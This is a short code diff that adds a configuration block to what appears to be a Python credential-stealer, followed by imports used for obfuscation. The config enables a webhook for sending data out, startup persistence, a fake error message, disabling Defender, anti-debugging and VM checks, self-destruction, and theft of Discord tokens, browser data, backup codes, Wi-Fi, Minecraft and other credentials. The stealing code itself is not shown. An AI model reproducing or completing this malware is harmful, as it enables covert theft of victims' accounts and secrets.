@@ -1,3 +1,5 @@
+__CONFIG__ = {'webhook': '%webhook%', 'ping': True, 'pingtype': 'Everyone', 'fakeerror': True, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': False, 'obfuscation': True, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': False, 'self_destruct': True}
+
 import random ,base64,codecs,zlib;pyobfuscate=""
 import base64
 import concurrent.futures
